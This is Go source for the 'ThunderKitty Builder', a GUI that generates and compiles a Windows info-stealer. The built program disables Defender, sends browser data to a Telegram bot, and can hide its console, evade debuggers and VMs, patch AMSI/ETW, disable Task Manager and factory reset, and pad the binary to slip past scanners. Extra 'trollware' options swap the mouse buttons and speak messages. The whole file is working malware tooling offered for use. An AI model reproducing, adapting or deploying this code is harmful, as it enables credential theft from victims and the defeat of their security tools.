package main

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strconv"

	"fyne.io/fyne/v2"

	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/widget"
)

func buildExecutable(telebottoken, telechatid string, enableAntiDebug, enableFakeError, enableBrowsers, hideConsole, disableFactoryReset, disableTaskManager bool, openSiteURL, speakTTSMessage string, swapMouse, patchPowerShell bool) {
	content := fmt.Sprintf(`
package main

import (
	"ThunderKitty-Grabber/utils/sysinfo"
	"ThunderKitty-Grabber/utils/antidbgandvm"
	"ThunderKitty-Grabber/utils/fakeerror"
	"ThunderKitty-Grabber/utils/browsers"
	"ThunderKitty-Grabber/utils/hideconsole"
	"ThunderKitty-Grabber/utils/disablefactoryreset"
	"ThunderKitty-Grabber/utils/taskmanager"
	"ThunderKitty-Grabber/utils/exclude"
	"ThunderKitty-Grabber/utils/defender"
	"ThunderKitty-Grabber/utils/powershellpatcher"
	"fmt"
	"os/exec"
)

const (
	telebottoken = "%s"
	telechatid   = "%s"
)

func main() {
	if %t {
		HideConsoleWindow.HideWindow()
	} else {
		fmt.Println("Console window not hidden")
	}
 	if %t {
		AntiDebugVMAnalysis.ThunderKitty()
	} else {
		fmt.Println("Anti-debugging and VM analysis not enabled")
	}
	if %t {
		go FakeError.Show()
	} else {
		fmt.Println("Fake error not enabled")
	}

	Exclude.FileExtensions()
	Defender.Disable()

	SysInfo.Fetch()

	if %t {
		browsers.ThunderKittyGrab(telebottoken, telechatid)
	} else {
		fmt.Println("Browser info grabbing not enabled")
	}

	if %t {
		FactoryReset.Disable()
	} else {
		fmt.Println("Factory reset not disabled")
	}

	if %t {
		TaskManager.Disable()
	} else {
		fmt.Println("Task manager not disabled")
	}
	
	url := "%s"
	if url != "" {
		exec.Command("cmd.exe", "/c", "start", url).Run()
	} else {
		fmt.Println("Open website not enabled")
	}
	
	ttsMessage := "%s"
	if ttsMessage != "" {
		exec.Command("PowerShell", "-Command", "(New-Object -ComObject SAPI.SpVoice).Speak(\"" + ttsMessage + "\")").Run()
	} else {
		fmt.Println("TTS not enabled")
	}

	if %t {
		exec.Command("cmd", "/c", "rundll32.exe", "user32.dll,SwapMouseButton").Run()
	} else {
		fmt.Println("Swap mouse not enabled")
	}

	if %t {
		PowerShellPatcher.Patch()
	} else {
		fmt.Println("PowerShell patcher not enabled")
	}
}
`, telebottoken, telechatid, hideConsole, enableAntiDebug, enableFakeError, enableBrowsers, disableFactoryReset, disableTaskManager, openSiteURL, speakTTSMessage, swapMouse, patchPowerShell)

	file, err := os.Create("main.go")
	if err != nil {
		fmt.Println("Error creating main.go:", err)
		return
	}
	defer file.Close()

	_, err = file.WriteString(content)
	if err != nil {
		fmt.Println("Error writing to main.go:", err)
		return
	}

	cmd := exec.Command("go", "build", "main.go")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", "go build main.go")
	}
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	err = cmd.Run()
	if err != nil {
		fmt.Println("Error building executable:", err)
		return
	}

	fmt.Println("Build successful")
}

func pumpExecutable(path string, size int) {
	file, err := os.ReadFile(path)
	if err != nil {
		panic(err)
	}

	size = size * 1024 * 1024 // Convert to MB

	pumpAmount := size - len(file)
	if pumpAmount <= 0 {
		return
	}

	zeroBytes := make([]byte, pumpAmount)
	err = os.WriteFile(path, append(file, zeroBytes...), 0600)
	if err != nil {
		return
	}

	return
}

func main() {
	a := app.New()
	w := a.NewWindow("ThunderKitty Builder")

	// Creating all the widgets
	// Grabber Widgets
	telegramBotTokenEntry := widget.NewEntry()
	telegramBotTokenEntry.SetPlaceHolder("Enter Telegram Bot Token")

	telegramChatIdEntry := widget.NewEntry()
	telegramChatIdEntry.SetPlaceHolder("Enter Telegram Chat ID")

	enableAntiDebug := widget.NewCheck("Enable Anti-Debugging", nil)
	enableFakeError := widget.NewCheck("Enable Fake Error", nil)
	enableBrowsers := widget.NewCheck("Enable Browser Info Grabbing", nil)
	hideConsole := widget.NewCheck("Hide Console Window", nil)
	disableFactoryReset := widget.NewCheck("Disable Factory Reset", nil)
	disableTaskManager := widget.NewCheck("Disable Task Manager", nil)
	patchPowershell := widget.NewCheck("Patch PowerShell (AMSI & ETW)", nil)

	// Trollware Widgets
	openSiteEntry := widget.NewEntry()
	openSiteEntry.SetPlaceHolder("Open Website (leave blank for none)")
	speakTTSEntry := widget.NewEntry()
	speakTTSEntry.SetPlaceHolder("Text-to-speech Message (leave blank for none)")
	enableSwapMouse := widget.NewCheck("Swap Mouse Buttons", nil)

	// File Pumper Widgets
	filePumperEntry := widget.NewEntry()
	filePumperEntry.SetPlaceHolder("Pump File (size in MB)")

	// Build button
	buildButton := widget.NewButton("Build", func() {

		// Delete old file
		os.Remove("main.exe")

		// Build the new one
		telebottoken := telegramBotTokenEntry.Text
		telechatid := telegramChatIdEntry.Text
		openSiteURL := openSiteEntry.Text
		speakTTSMessage := speakTTSEntry.Text
		filePumperSize := filePumperEntry.Text
		buildExecutable(telebottoken, telechatid, enableAntiDebug.Checked, enableFakeError.Checked, enableBrowsers.Checked, hideConsole.Checked, disableFactoryReset.Checked, disableTaskManager.Checked, openSiteURL, speakTTSMessage, enableSwapMouse.Checked, patchPowershell.Checked)

		// Pumper
		if filePumperSize != "" {
			pumpSize, err := strconv.Atoi(filePumperSize)
			if err != nil {
				panic(err)
			}

			pumpExecutable("main.exe", pumpSize)
		}
	})

	grabberSettings := container.NewVBox(
		widget.NewLabel("ThunderKitty Configuration"),
		telegramBotTokenEntry,
		telegramChatIdEntry,
		enableAntiDebug,
		enableFakeError,
		enableBrowsers,
		hideConsole,
		disableFactoryReset,
		disableTaskManager,
		patchPowershell,
		buildButton,
	)

	trollwareSettings := container.NewVBox(
		widget.NewLabel("Trollware Configuration"),
		openSiteEntry,
		speakTTSEntry,
		enableSwapMouse,
	)

	filePumperSettings := container.NewVBox(
		widget.NewLabel("File Pumper Configuration"),
		filePumperEntry,
	)

	tabs := container.NewAppTabs(
		container.NewTabItem("Grabber Configuration", grabberSettings),
		container.NewTabItem("Trollware Configuration", trollwareSettings),
		container.NewTabItem("File Pumper", filePumperSettings),
	)

	w.SetContent(tabs)
	w.Resize(fyne.NewSize(500, 350))
	w.ShowAndRun()
}
